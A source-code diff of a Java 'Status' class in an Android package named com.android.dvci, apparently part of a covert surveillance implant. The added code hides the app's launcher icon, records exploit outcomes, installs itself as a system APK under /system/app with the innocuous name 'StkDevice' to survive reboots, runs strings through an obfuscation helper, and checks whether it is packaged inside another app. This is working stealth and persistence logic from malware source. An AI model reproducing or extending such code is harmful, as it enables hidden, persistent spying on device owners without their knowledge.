@@ -7,8 +7,10 @@
 
 package com.android.dvci;
 
+import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Handler;
@@ -21,7 +23,9 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfEvent;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.conf.Globals;
+import com.android.dvci.crypto.Digest;
 import com.android.dvci.event.BaseEvent;
+import com.android.dvci.file.AutoFile;
 import com.android.dvci.gui.ASG;
 import com.android.dvci.module.ModuleCrisis;
 import com.android.dvci.util.Check;
@@ -93,6 +97,8 @@ public class Status {
 	static public boolean uninstall;
 
 	static WakeLock wl;
+	public static Object uninstallLock = new Object();
+
 	private final Date startedTime = new Date();
 
 	private boolean deviceAdmin;
@@ -111,12 +117,28 @@ public class Status {
 	public static final int EXPLOIT_RESULT_FAIL = 1;
 	public static final int EXPLOIT_RESULT_SUCCEED = 2;
 	public static final int EXPLOIT_RESULT_NOTNEEDED = 3;
-
-
 	private static int exploitStatus = EXPLOIT_STATUS_NONE;
 	private static int exploitResult = EXPLOIT_RESULT_NONE;
-	RunningProcesses runningProcess = new RunningProcesses();
+
+	public static final int PERSISTENCY_STATUS_NOT_REQUIRED = -1;
+	public static final int PERSISTENCY_STATUS_TO_INSTALL = 0;
+	public static final int PERSISTENCY_STATUS_FAILED = 1;
+	public static final int PERSISTENCY_STATUS_PRESENT_TOREBOOT = 2;
+	public static final int PERSISTENCY_STATUS_PRESENT = 3;
+
+
+	public static final String persistencyPackage = M.e("StkDevice");
+	public static final String persistencyApk = M.e("/system/app/") + persistencyPackage + M.e(".apk");
+
+	private static ArrayList<String> activityList = null;
+	static boolean activityListTested = false;
+	private static int persistencyStatus = PERSISTENCY_STATUS_NOT_REQUIRED;
+
+
+	RunningProcesses runningProcess = RunningProcesses.self();
 	public Object lockFramebuffer = new Object();
+
+	private static ASG gui;
 
 	/**
 	 * Instantiates a new status.
@@ -126,7 +148,11 @@ public class Status {
 		modulesMap = new HashMap<String, ConfModule>();
 		eventsMap = new HashMap<Integer, ConfEvent>();
 		actionsMap = new HashMap<Integer, Action>();
-
+		if (Cfg.PERSISTENCE) {
+			persistencyStatus = PERSISTENCY_STATUS_TO_INSTALL;
+		} else {
+			persistencyStatus = PERSISTENCY_STATUS_NOT_REQUIRED;
+		}
 		for (int i = 0; i < Action.NUM_QUEUE; i++) {
 			triggeredSemaphore[i] = new Object();
 			triggeredActions[i] = new ArrayList<Integer>();
@@ -138,7 +164,6 @@ public class Status {
 	 */
 	private volatile static Status singleton;
 
-	private static ASG gui;
 
 	/**
 	 * Self.
@@ -213,6 +238,13 @@ public class Status {
 
 	public static ASG getAppGui() {
 		return gui;
+	}
+
+	public static boolean isGuiVisible() {
+		if(Cfg.GUI){
+			return RunningProcesses.self().isGuiVisible();
+		}
+		return false;
 	}
 
 	public static ContentResolver getContentResolver() {
@@ -316,7 +348,7 @@ public class Status {
 			case EXPLOIT_STATUS_EXECUTED:
 				return M.e("RUN");
 			case EXPLOIT_STATUS_NOT_POSSIBLE:
-				return M.e("NO POSSIBLE");
+				return M.e("NOT POSSIBLE");
 			default:
 				break;
 		}
@@ -484,7 +516,7 @@ public class Status {
 		}
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (triggerAction): notifing queue: " + qq);
+			Check.log(TAG + " (triggerAction): notifing queue: " + qq + " size: " + triggeredActions[qq].size());
 		}
 		synchronized (tsem) {
 			try {
@@ -543,6 +575,9 @@ public class Status {
 
 		synchronized (tsem) {
 			final int size = act.size();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getTriggeredActions):  size: " + size); //$NON-NLS-1$ //$NON-NLS-2$
+			}
 			final Trigger[] triggered = new Trigger[size];
 
 			for (int i = 0; i < size; i++) {
@@ -788,7 +823,7 @@ public class Status {
 	}
 
 	public String getForeground() {
-		return runningProcess.getForeground();
+		return runningProcess.getForeground_wrapper();
 	}
 
 	public RunningProcesses getRunningProcess() {
@@ -807,9 +842,9 @@ public class Status {
 
 	private boolean checkCameraHardware() {
 
-		if(Build.DEVICE.equals("mako")){
+		if (Build.DEVICE.equals(M.e("mako")) && android.os.Build.VERSION.SDK_INT < 18) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (checkCameraHardware), disabled on NEXYS");
+				Check.log(TAG + " (checkCameraHardware), disabled on nexus4 up to 4.2");
 			}
 			return false;
 		}
@@ -831,11 +866,174 @@ public class Status {
 		}
 	}
 
+	static public void setIconState(Boolean hide) {
+		// Nascondi l'icona (subito in android 4.x, al primo reboot
+		// in android 2.x)
+		if(!Cfg.GUI){
+			return;
+		}
+		PackageManager pm = Status.self().getAppContext().getPackageManager();
+
+		ComponentName cn = new ComponentName(Status.self().getAppContext().getPackageName(), ASG.class.getCanonicalName());
+		int i = pm.getComponentEnabledSetting(cn);
+		if (hide) {
+			if (i != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Hide ICON for:" + cn);//$NON-NLS-1$
+				}
+				pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+						PackageManager.DONT_KILL_APP);
+			}
+		} else {
+			int n = 0;
+			while (i == PackageManager.COMPONENT_ENABLED_STATE_DISABLED && n++ < 2) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " RESTORE ICON for:" + cn);//$NON-NLS-1$
+				}
+				pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
+						PackageManager.DONT_KILL_APP);
+				try {
+					Thread.sleep(2000);
+					i = pm.getComponentEnabledSetting(cn);
+				} catch (InterruptedException e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "Exception RESTORE ICON for:" + cn + e);//$NON-NLS-1$
+					}
+				}
+			}
+		}
+	}
+
+	public static PackageInfo getMyPackageInfo() {
+		PackageInfo pi = null;
+		PackageManager pm = Status.self().getAppContext().getPackageManager();
+		try {
+			pi = pm.getPackageInfo(Status.self().getAppContext().getPackageName(), 0);
+		} catch (PackageManager.NameNotFoundException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getMyPackageInfo) error:" + e);
+			}
+			return null;
+		}
+		return pi;
+	}
+
 	public boolean haveCamera() {
 
-		if(haveCamera == -1) {
-			haveCamera = checkCameraHardware()?1:0;
+		if (haveCamera == -1) {
+			haveCamera = checkCameraHardware() ? 1 : 0;
 		}
 		return haveCamera == 1;
+	}
+
+	/*
+	 * return true if we did a persisten installation and
+	 * apk name contained in applicationInfo.sourceDir mismatch
+	 * with the new one , in that case a reboot is needed to
+	 * align the two info.
+	 */
+	public static Boolean needReboot() {
+		PackageInfo pi = null;
+		if ((pi = getMyPackageInfo()) != null) {
+			if (persistencyApk != null && !pi.applicationInfo.sourceDir.equals(persistencyApk)) {
+				return true;
+			}
+		}
+		return false;
+	}
+
+	public static String getApkName() {
+		PackageInfo pi = null;
+		if ((pi = getMyPackageInfo()) != null) {
+			return pi.applicationInfo.sourceDir;
+		}
+		return null;
+	}
+
+	public static String getAppDir() {
+		PackageInfo pi = null;
+		if ((pi = getMyPackageInfo()) != null) {
+			return pi.applicationInfo.dataDir;
+		}
+		return null;
+	}
+
+	/**
+	 * already persistent and rebooted
+	 * @return
+	 */
+	public static Boolean isPersistent() {
+		String apkName = getApkName();
+		if (apkName != null) {
+			return apkName.contains(M.e("/system/app/"));
+		}
+		return false;
+	}
+
+	/**
+	 * Installed but not yet reboot
+	 * @return
+	 */
+	public static Boolean persistencyReady() {
+		AutoFile apkFile = new AutoFile(persistencyApk);
+		if (apkFile.exists()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (persistencyReady) apk already there" + persistencyApk);
+			}
+			return true;
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (persistencyReady) apk NOT PRESENT there" + persistencyApk);
+		}
+		return false;
+	}
+
+	public static void setPersistencyStatus(int i) {
+		persistencyStatus = i;
+	}
+
+	public static int getPersistencyStatus() {
+		return persistencyStatus;
+	}
+
+	public static String getPersistencyStatusStr() {
+		if (!Cfg.PERSISTENCE)
+			return M.e("not required[c]");
+		switch (persistencyStatus) {
+			case PERSISTENCY_STATUS_FAILED:
+				return M.e("installation failed");
+			case PERSISTENCY_STATUS_NOT_REQUIRED:
+				return M.e("not required");
+			case PERSISTENCY_STATUS_PRESENT:
+				return M.e("present");
+			case PERSISTENCY_STATUS_PRESENT_TOREBOOT:
+				return M.e("present, not yet rebooted");
+			case PERSISTENCY_STATUS_TO_INSTALL:
+				return M.e("required, to be installed");
+			default:
+				break;
+		}
+		return M.e("UNKNOWN");
+	}
+
+	public static boolean isMelt() {
+
+		String pack = Status.self().getAppContext().getPackageName();
+		// echo -n "com.android.dvci" | md5
+		boolean equal = Digest.MD5(pack).equals("b232a7613976c9420b76780ec6c225a8");
+		return !(equal);
+
+		/*if (activityListTested == false) {
+			activityList = PackageUtils.getActivitisFromApk(getApkName());
+			activityListTested = true;
+		}
+		if (activityList != null && !activityList.isEmpty()) {
+			for (String s : activityList) {
+				if (!s.contains(Status.self().getAppContext().getPackageName())) {
+					return true;
+				}
+			}
+		}
+		return false;*/
 	}
 }
